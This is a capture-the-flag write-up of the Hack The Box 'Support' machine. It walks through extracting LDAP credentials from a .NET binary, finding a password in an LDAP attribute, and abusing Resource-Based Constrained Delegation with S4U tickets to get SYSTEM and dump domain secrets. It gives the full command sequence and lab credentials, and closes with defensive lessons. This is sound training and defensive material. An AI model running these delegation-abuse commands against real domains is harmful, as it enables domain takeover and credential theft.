---
title: 'Support'
target: 'Hack The Box — Support'
difficulty: 'easy'
date: 2025-09-15
summary: 'An easy Windows AD box — extracting LDAP credentials from a .NET binary on an anonymous SMB share, finding the support user''s cleartext password in an LDAP attribute, abusing GenericAll-equivalent ACLs on DC$ via Resource-Based Constrained Delegation and S4U impersonation for SYSTEM access.'
role: 'pentest'
tags: ['nmap', 'smb', 'anonymous-access', 'dotnet', 'reverse-engineering', 'strace', 'ldap', 'active-directory', 'rbcd', 'kerberos', 's4u', 'delegation', 'privilege-escalation']
problem: 'The SMB support-tools share is anonymously readable and contains UserInfo.exe with hardcoded LDAP credentials. The support user''s password sits in a cleartext LDAP attribute, and its group (Shared Support Accounts) has GenericAll-equivalent rights on DC$, enabling RBCD for domain compromise.'
action: 'Port scan found 11 open ports on DC.support.htb. Anonymous SMB gave access to the support-tools share containing UserInfo.exe. Ran the .NET binary under strace to capture the LDAP bind password (nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz) at runtime. Queried support''s LDAP attributes and found the cleartext password Ironside47pleasure40Watchful in the info field. ACL enumeration showed Shared Support Accounts (support''s group) has GenericAll-equivalent rights on DC$. Created a machine account, configured RBCD on DC$, performed S4U2Self/S4U2Proxy to get an Administrator CIFS ticket, and obtained a SYSTEM shell.'
outcome: 'Gained SYSTEM on the DC. Anonymous SMB to LDAP credential extraction, cleartext password in LDAP attribute, and RBCD abuse via Shared Support Accounts ACLs for Administrator impersonation.'
draft: false
---

## Background

Support is an easy-rated Windows Active Directory machine centered on a domain controller. The attack chain is a textbook demonstration of how small Active Directory misconfigurations compound into full domain compromise — anonymous SMB access exposes a .NET utility with embedded LDAP credentials, those credentials unlock the directory where a user's password sits in a cleartext attribute, and that user's group membership carries GenericAll-equivalent permissions on the domain controller object, enabling Resource-Based Constrained Delegation to impersonate Administrator. Each step is individually a common AD finding; the box's value is in showing how they chain together seamlessly.

---

## Enumeration

A port scan against the target reveals 11 open ports — the standard Active Directory service stack on a domain controller:

```
PORT      STATE  SERVICE        VERSION
   53/tcp  open   dns            Microsoft Windows DNS
   88/tcp  open   kerberos-sec   Microsoft Windows Kerberos
  135/tcp  open   msrpc          Microsoft Windows RPC
  139/tcp  open   netbios-ssn    Microsoft Windows netbios-ssn
  389/tcp  open   ldap           Microsoft Windows Active Directory LDAP (Domain: support.htb)
  445/tcp  open   microsoft-ds   Microsoft Windows SMB (SMB 3.0.2, signing required)
  464/tcp  open   kpasswd5
  593/tcp  open   ncacn_http     Microsoft Windows RPC over HTTP 1.0
  636/tcp  open   ldaps
 3268/tcp  open   ldap-gc        Microsoft Windows Active Directory Global Catalog
 5985/tcp  open   winrm          Microsoft-HTTPAPI/2.0
```

DNS, Kerberos, LDAP, SMB with signing required, and WinRM — a domain controller running `DC.support.htb` for the `support.htb` domain.

---

## Anonymous SMB — UserInfo.exe

Checking SMB shares anonymously reveals six shares, with `support-tools` readable:

```
name              type    perm          comment
ADMIN$            disk    none          Remote Admin
C$                disk    none          Default share
IPC$              ipc     read          Remote IPC
NETLOGON          disk    read          Logon server share
support-tools     disk    read          support staff tools
SYSVOL            disk    read          Logon server share
```

Spidering the share reveals standard IT utilities (7-Zip, PuTTY, Notepad++, Wireshark, Sysinternals) and one custom file: **UserInfo.exe.zip** (277,499 bytes). Downloading and extracting it reveals a .NET binary with supporting DLLs — it queries LDAP to look up user information.

---

## Extracting the LDAP credential

Pulling Unicode strings from the binary with `monodis --userstrings` reveals references to `support\\ldap`, `LDAP://support.htb`, and an encoded string `0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E`. The binary contains a decryption routine that decodes this into the actual LDAP bind password at runtime. Rather than reverse-engineering the decryption logic statically, running the binary under `strace` and filtering for network calls captures the LDAP bind in plaintext:

```bash
strace -f -e trace=network -s 10000 mono UserInfo.exe user -username ldap -verbose 2>&1 | grep -i "bind\|simple\|pass\|ldap"
```

The `sendto()` call reveals the credentials in the LDAP simple bind request:

```
sendto(3, "...\x04\x0csupport\\ldap\x80$nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz", ...)
```

Credentials recovered: `support.htb\ldap` / `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`.

---

## LDAP enumeration — the support user's password

With valid LDAP credentials, enumerating domain users reveals 20 accounts — Administrator, Guest, krbtgt, ldap, support, and 15 named accounts (smith.rosario, hernandez.stanley, wilson.shelby, and others). Querying the `support` user's attributes reveals two critical pieces of information.

First, group membership:

```
memberOf:
  CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
  CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
```

The `Remote Management Users` membership means WinRM access is available. Second, and more immediately useful — the `info` LDAP attribute contains a plaintext password:

```
info: Ironside47pleasure40Watchful
```

This works as the password for the `support` domain user. The `info` attribute is a general-purpose freetext field that's readable by any authenticated user by default — storing passwords in it is equivalent to posting them on a whiteboard.

---

## ACL enumeration — Shared Support Accounts

With the `support` user's credentials validated, the next step is understanding what the `Shared Support Accounts` group (which `support` belongs to) can do. RID brute-forcing via SMB maps domain SIDs to names and identifies `Shared Support Accounts` at RID **1103**:

![Nimux SMB lookupsid output against 10.129.100.245 using ldap credentials, showing SMB 3.0.2 dialect with signing required, domain support.htb, session authenticated as support.htb\ldap. RID brute results listing 41 entries including standard accounts (500 Administrator, 501 Guest, 502 krbtgt), domain groups (512-527), service groups (553, 571-572), DC$ at 1000, DnsAdmins 1101, DnsUpdateProxy 1102, Shared Support Accounts at 1103 highlighted in blue, ldap 1104, support 1105, smith.rosario 1106, hernandez.stanley 1107, wilson.shelby 1108.](/writeups/htb-support/01-lookupsid.png)

Querying the ACL on the DC$ computer object reveals that SID ending in `-1103` (Shared Support Accounts) has extensive permissions:

![Nimux LDAP ACL query against DC object showing target CN=DC,OU=Domain Controllers,DC=support,DC=htb with owner and group SIDs. Multiple ACE entries with type 5 showing WriteProperty, Self, ReadProperty,WriteProperty, CreateChild,DeleteChild, ReadProperty permissions for various object GUIDs. At the bottom, type 0 entries showing the domain SID with WriteDACL,WriteOwner,ReadControl,Delete,CreateChild,DeleteChild,ListContents,Self,ReadProperty,WriteProperty,DeleteTree,ListObject,ControlAccess, and the same full permission set for SID ending in -1103 (Shared Support Accounts) highlighted at the bottom.](/writeups/htb-support/02-dc-acl.png)

The `Shared Support Accounts` group has **WriteDACL, WriteOwner, WriteProperty, and ControlAccess** on the domain controller object — effectively GenericAll-equivalent permissions. This opens the door for Resource-Based Constrained Delegation.

---

## Resource-Based Constrained Delegation

The RBCD attack requires three steps: create a controlled computer account, configure the DC to trust delegation from that account, and use S4U to impersonate Administrator.

**Creating a controlled computer account:**

```bash
nimux ldap 10.129.100.245 -u support -p 'Ironside47pleasure40Watchful' \
    -d support.htb --create computer --name 'EVIL1$' --new-pass 'Password123'
```

The `support` user has sufficient domain privileges to create machine accounts (the default `ms-DS-MachineAccountQuota` is 10).

**Setting RBCD on DC$:**

```bash
nimux ldap 10.129.100.245 -u support -p 'Ironside47pleasure40Watchful' \
    -d support.htb --set-rbcd --from 'EVIL1$' --to 'DC$'
```

This modifies the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the DC$ object, configuring it to accept delegation from `EVIL1$`. The `support` user can write this attribute because of the WriteProperty permission inherited from the `Shared Support Accounts` group.

**Requesting a TGT for EVIL1$:**

```bash
nimux kerberos 10.129.100.245 -d support.htb -u 'EVIL1$' -p 'Password123' \
    --request kinit --out EVIL1.ccache --krb5-config support.krb5.conf
```

**S4U impersonation — obtaining an Administrator service ticket:**

```bash
nimux kerberos 10.129.100.245 -d support.htb --request s4u \
    --ccache EVIL1.ccache --user Administrator \
    --service cifs/DC.support.htb --out administrator-cifs.ccache \
    --krb5-config support.krb5.conf
```

The S4U2Self step obtains a forwardable service ticket for Administrator to `EVIL1$`, and S4U2Proxy exchanges it for a CIFS service ticket to `DC.support.htb`. Testing command execution with the impersonated ticket:

```
nimux scm DC.support.htb -k -u Administrator -d support.htb \
    --ccache administrator-cifs.ccache --krb5-config support.krb5.conf \
    --cmd whoami

nt authority\system
```

SYSTEM-level access on the domain controller.

---

## Flags and secrets dump

With the Administrator CIFS ticket, an interactive shell retrieves both flags:

```
[scm@DC.support.htb C:\Windows\system32]# type \users\support\Desktop\user.txt
[scm@DC.support.htb C:\Windows\system32]# type \users\Administrator\Desktop\root.txt
```

Both flags were retrieved. Dumping domain secrets with the same ticket extracts all account hashes, the machine account password, LSA secrets, and DPAPI backup keys:

![Nimux secrets dump against DC.support.htb using Kerberos authentication as Administrator, showing auth ok, boot key f678b2597ade18d88784ee424ddc0d1a, 4 account hashes — Administrator (RID 500) with NT hash partially visible before red redaction box, Guest (RID 501), DefaultAccount (RID 503), WDAGUtilityAccount (RID 504) all with aad3b hashes. LSA secrets section showing 2 secrets — $MACHINE.ACC with plain_password_hex and machine account hash, SUPPORT\DC$ with aes256-cts and aes128-cts and des-cbc-md5 keys. NL$KM raw key, Backup key domain DPAPI backup, all partially covered by red redaction rectangle.](/writeups/htb-support/03-secrets-dump.png)

Full domain compromise achieved.

---

## What I took from this

The `info` attribute password storage on Support is the kind of finding that appears frequently in real Active Directory environments. The `info` field (and similar general-purpose attributes like `description` and `comment`) is readable by any authenticated domain user by default. Administrators sometimes store passwords, recovery keys, or connection strings in these fields because they're convenient and searchable — but they have no access controls beyond the default LDAP read permissions. Any LDAP enumeration tool will find them. The fix is to never store secrets in LDAP attributes, and to audit existing attributes with automated scans for patterns that look like passwords.

The RBCD chain on this box is the modern approach to AD delegation abuse. Unlike classical unconstrained or constrained delegation (which require the `TRUSTED_FOR_DELEGATION` or `msDS-AllowedToDelegateTo` attributes that only domain admins can set), RBCD is configured on the *target* object via `msDS-AllowedToActOnBehalfOfOtherIdentity` — and any principal with write access to that attribute can set it. The combination of WriteProperty on a computer object plus the ability to create a machine account (the default `MachineAccountQuota` of 10 allows any authenticated user to do this) is sufficient for the entire attack. The defenses are layered: reduce `MachineAccountQuota` to 0, monitor changes to `msDS-AllowedToActOnBehalfOfOtherIdentity`, and audit ACLs on sensitive computer objects — especially domain controllers — to ensure that non-admin groups don't have write permissions they don't need.

The initial credential extraction from UserInfo.exe is worth noting as a pattern. Embedding service account credentials in client-side binaries is common in internal tooling — the developer needs the application to bind to LDAP or connect to a database, so they hardcode the credentials. Even if the binary is obfuscated or the password is encrypted within the code, it must be decrypted at runtime to make the connection, and `strace` or a debugger will capture the plaintext on the wire. The solution is service accounts with minimal permissions authenticated via Kerberos (which doesn't require embedding passwords) or, at minimum, managed service accounts with automatic password rotation.
